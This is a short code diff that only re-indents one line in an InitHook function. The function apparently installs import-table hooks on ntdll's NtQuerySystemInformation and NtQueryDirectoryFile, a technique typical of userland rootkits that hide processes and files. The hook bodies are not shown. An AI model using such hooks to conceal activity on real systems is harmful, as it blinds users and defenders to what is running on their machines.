@@ -82,7 +82,7 @@ NTSTATUS WINAPI hkNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_
 void InitHook()
 {
     lpOrgNtQuerySystemInformation = (lpNtQuerySystemInformation) IAT::Hook("ntdll.dll", "NtQuerySystemInformation", &hkNtQuerySystemInformation);
-	lpOrgNtQueryDirectoryFile = (lpNtQueryDirectoryFile) IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", &hkNtQueryDirectoryFile, "windows.storage.dll");
+    lpOrgNtQueryDirectoryFile = (lpNtQueryDirectoryFile) IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", &hkNtQueryDirectoryFile, "windows.storage.dll");
 
     ExitThread(0);
 }
